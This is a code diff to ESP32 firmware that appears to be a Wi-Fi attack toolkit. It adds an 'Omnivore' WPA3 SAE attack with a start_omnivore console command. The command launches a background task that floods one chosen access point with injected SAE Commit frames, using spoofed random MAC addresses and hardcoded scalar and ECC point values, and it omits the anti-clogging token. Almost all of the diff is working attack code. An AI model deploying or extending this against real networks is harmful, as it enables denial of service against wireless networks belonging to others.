@@ -174,6 +174,10 @@ static volatile bool periodic_rescan_in_progress = false; // Flag to suppress lo
 static TaskHandle_t sae_attack_task_handle = NULL;
 static volatile bool sae_attack_active = false;
 
+// Omnivore attack task
+static TaskHandle_t omnivore_attack_task_handle = NULL;
+static volatile bool omnivore_attack_active = false;
+
 // Sniffer Dog attack task
 static TaskHandle_t sniffer_dog_task_handle = NULL;
 static volatile bool sniffer_dog_active = false;
@@ -321,6 +325,10 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
 static void deauth_attack_task(void *pvParameters);
 static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
+static void omnivore_attack_task(void *pvParameters);
+// SAE frame injection functions
+void inject_sae_commit_frame(void);
+void inject_sae_commit_frame_omnivore(void);
 // DNS server task
 static void dns_server_task(void *pvParameters);
 // Portal HTTP handlers
@@ -362,7 +370,6 @@ static void load_whitelist_from_sd(void);
 static bool is_bssid_whitelisted(const uint8_t *bssid);
 // SAE WPA3 attack methods forward declarations:
 //add methods declarations below:
-static void inject_sae_commit_frame();
 static void prepareAttack(const wifi_ap_record_t ap_record);
 static void update_spoofed_src_random(void);
 static int crypto_init(void);
@@ -1515,6 +1522,68 @@ static int cmd_start_sae_overflow(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_start_omnivore(int argc, char **argv) {
+    //avoid compiler warnings:
+    (void)argc; (void)argv;
+    
+    // Check if Omnivore attack is already running
+    if (omnivore_attack_active || omnivore_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Omnivore attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    // Reset stop flag at the beginning of operation
+    operation_stop_requested = false;
+
+    if (g_selected_count == 1) {
+        applicationState = SAE_OVERFLOW;
+        int idx = g_selected_indices[0];
+        const wifi_ap_record_t *ap = &g_scan_results[idx];
+        
+        // Set LED
+        esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 165, 0);  // Orange LED for Omnivore
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
+        MY_LOG_INFO(TAG,"WPA3 SAE Omnivore Attack");
+        MY_LOG_INFO(TAG,"Target: SSID='%s' Ch=%d Auth=%d", (const char*)ap->ssid, ap->primary, ap->authmode);
+        MY_LOG_INFO(TAG,"Omnivore attack started. Use 'stop' to stop.");
+        
+        // Allocate memory for ap_record to pass to task
+        wifi_ap_record_t *ap_copy = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t));
+        if (ap_copy == NULL) {
+            MY_LOG_INFO(TAG, "Failed to allocate memory for Omnivore attack!");
+            applicationState = IDLE;
+            return 1;
+        }
+        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
+        
+        // Start Omnivore attack in background task
+        omnivore_attack_active = true;
+        BaseType_t result = xTaskCreate(
+            omnivore_attack_task,
+            "omnivore_task",
+            8192,  // Larger stack size for crypto operations
+            ap_copy,
+            5,     // Priority
+            &omnivore_attack_task_handle
+        );
+        
+        if (result != pdPASS) {
+            MY_LOG_INFO(TAG, "Failed to create Omnivore attack task!");
+            free(ap_copy);
+            omnivore_attack_active = false;
+            applicationState = IDLE;
+            return 1;
+        }
+        
+    } else {
+        MY_LOG_INFO(TAG,"Omnivore Attack: you need to select exactly ONE network (use select_networks).");
+    }
+    return 0;
+}
+
 // Blackout attack command - scans all networks every 3 minutes, sorts by channel, attacks all
 static int cmd_start_blackout(int argc, char **argv) {
     //avoid compiler warnings:
@@ -1866,6 +1935,24 @@ static int cmd_stop(int argc, char **argv) {
             vTaskDelete(sae_attack_task_handle);
             sae_attack_task_handle = NULL;
             MY_LOG_INFO(TAG, "SAE overflow task forcefully stopped.");
+        }
+    }
+    
+    // Stop Omnivore attack task if running
+    if (omnivore_attack_active || omnivore_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping Omnivore attack task...");
+        omnivore_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && omnivore_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (omnivore_attack_task_handle != NULL) {
+            vTaskDelete(omnivore_attack_task_handle);
+            omnivore_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Omnivore attack task forcefully stopped.");
         }
     }
     
@@ -3772,6 +3859,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&sae_overflow_cmd));
 
+    const esp_console_cmd_t omnivore_cmd = {
+        .command = "start_omnivore",
+        .help = "Starts Omnivore SAE attack with hardcoded scalar/ECC values.",
+        .hint = NULL,
+        .func = &cmd_start_omnivore,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&omnivore_cmd));
+
     const esp_console_cmd_t blackout_cmd = {
         .command = "start_blackout",
         .help = "Starts blackout attack - scans all networks every 3 minutes, sorts by channel, attacks all",
@@ -4122,6 +4218,68 @@ static void sae_attack_task(void *pvParameters) {
 }
 
 /*
+Omnivore attack task - uses hardcoded scalar/ECC values and skips anti-clogging token
+*/
+static void omnivore_attack_task(void *pvParameters) {
+    wifi_ap_record_t *ap_record = (wifi_ap_record_t *)pvParameters;
+    
+    MY_LOG_INFO(TAG, "Omnivore attack task started.");
+    
+    prepareAttack(*ap_record);
+    int frame_count_check = 0;
+    
+    while (omnivore_attack_active) {
+        // Check for stop request (check every 10 frames for better responsiveness)
+        if (frame_count_check % 10 == 0) {
+            if (operation_stop_requested || !omnivore_attack_active) {
+                MY_LOG_INFO(TAG, "Omnivore attack: Stop requested, terminating...");
+                operation_stop_requested = false;
+                omnivore_attack_active = false;
+                applicationState = IDLE;
+                
+                // Clean up after attack
+                esp_wifi_set_promiscuous(false);
+                
+                // Clear LED (ignore errors if LED is in invalid state)
+                esp_err_t led_err = led_strip_clear(strip);
+                if (led_err == ESP_OK) {
+                    led_strip_refresh(strip);
+                }
+                
+                break;
+            }
+            
+            // Yield to allow UART console processing every 10 frames
+            taskYIELD();
+        }
+        
+        inject_sae_commit_frame_omnivore();
+        
+        // Delay to allow UART console processing (50ms gives better responsiveness)
+        vTaskDelay(pdMS_TO_TICKS(50));
+        frame_count_check++;
+    }
+    
+    // Clean up LED after attack finishes naturally (ignore LED errors)
+    esp_err_t led_err = led_strip_clear(strip);
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
+    
+    // Clean up after attack
+    esp_wifi_set_promiscuous(false);
+    
+    omnivore_attack_active = false;
+    omnivore_attack_task_handle = NULL;
+    MY_LOG_INFO(TAG, "Omnivore attack task finished.");
+    
+    // Free the allocated memory for ap_record
+    free(pvParameters);
+    
+    vTaskDelete(NULL); // Delete this task
+}
+
+/*
 Injects SAE Commit frame with spoofed source address.
 This function generates a random scalar, computes the corresponding ECC point,
 and constructs the SAE Commit frame with the spoofed source address.
@@ -4212,6 +4370,91 @@ void inject_sae_commit_frame() {
         
         // Debug logging only (disabled by default to avoid UART spam)
         ESP_LOGD(TAG, "SAE Overflow: AVG FPS: %.2f", fps);
+        
+        framesPerSecond = (int)fps;
+        frame_count = 0;
+        if (framesPerSecond == 0) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+    }
+}
+
+/*
+Injects SAE Commit frame with spoofed source address using hardcoded scalar and ECC values.
+This is the Omnivore attack version that uses pre-computed values and skips anti-clogging token.
+*/
+void inject_sae_commit_frame_omnivore() {
+    uint8_t buf[256];  
+    memset(buf, 0, sizeof(buf));
+    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
+    memcpy(buf + 4, bssid, 6);
+    memcpy(buf + 10, spoofed_src, 6);
+    memcpy(buf + 16, bssid, 6);
+
+    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size
+
+    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
+    size_t scalar_size = 32;
+
+    // Hardcoded scalar value (Omnivore)
+    const uint8_t hardcoded_scalar[32] = {
+        0xce, 0x6c, 0x2b, 0xde, 0xe1, 0xe2, 0xae, 0xee,
+        0x59, 0x08, 0x1f, 0xca, 0xfc, 0x63, 0x6a, 0x79,
+        0xf3, 0x5c, 0x49, 0x7b, 0x1f, 0xcd, 0xfd, 0xc5,
+        0x8f, 0xa5, 0x2b, 0x41, 0x1d, 0x0d, 0x7f, 0x7c
+    };
+
+    // Copy hardcoded scalar to frame
+    memcpy(pos, hardcoded_scalar, scalar_size);
+    pos += scalar_size;
+
+    // Hardcoded finite element (ECC point) value (Omnivore)
+    const uint8_t hardcoded_element[64] = {
+        0x1d, 0xc0, 0xcd, 0x8e, 0x5d, 0x21, 0x04, 0x5a,
+        0x36, 0x97, 0x14, 0x81, 0x56, 0x06, 0x24, 0xfc,
+        0x0a, 0x72, 0xdc, 0x66, 0xe4, 0x66, 0xf1, 0xf0,
+        0xa8, 0x56, 0x84, 0xe9, 0xc1, 0x55, 0x6f, 0x0b,
+        0x89, 0xe1, 0x10, 0x59, 0xee, 0xde, 0x0f, 0xfc,
+        0x07, 0xea, 0x0a, 0x00, 0x67, 0xba, 0x4a, 0x66,
+        0x67, 0x73, 0x52, 0xbe, 0x69, 0x36, 0x5e, 0xf4,
+        0x88, 0xb4, 0xee, 0xa6, 0x9d, 0x83, 0xbe, 0x29
+    };
+
+    // Copy hardcoded element to frame
+    memcpy(pos, hardcoded_element, 64);
+    pos += 64;
+
+    // Skip anti-clogging token (Omnivore modification)
+    // No token appending at all
+
+    // Refresh MAC
+    update_spoofed_src_random();
+
+    size_t total_len = pos - buf;
+
+    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
+    if (ret_tx != ESP_OK) {
+        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
+    } else {
+        //log the frame:
+        //ESP_LOGD(TAG, "Injecting SAE Commit frame (Omnivore), total length: %d bytes", total_len);
+        // for (size_t i = 0; i < total_len; i++) {
+        //     printf("%02X ", buf[i]);
+        // }
+        //printf("\n");
+        // Send the frame
+    }
+
+    if (frame_count == 0) start_time = esp_timer_get_time();
+    frame_count++;
+
+    if (frame_count >= 100) {
+        int64_t now = esp_timer_get_time();
+        double seconds = (now - start_time) / 1e6;
+        double fps = frame_count / seconds;
+        
+        // Debug logging only (disabled by default to avoid UART spam)
+        ESP_LOGD(TAG, "Omnivore Attack: AVG FPS: %.2f", fps);
         
         framesPerSecond = (int)fps;
         frame_count = 0;
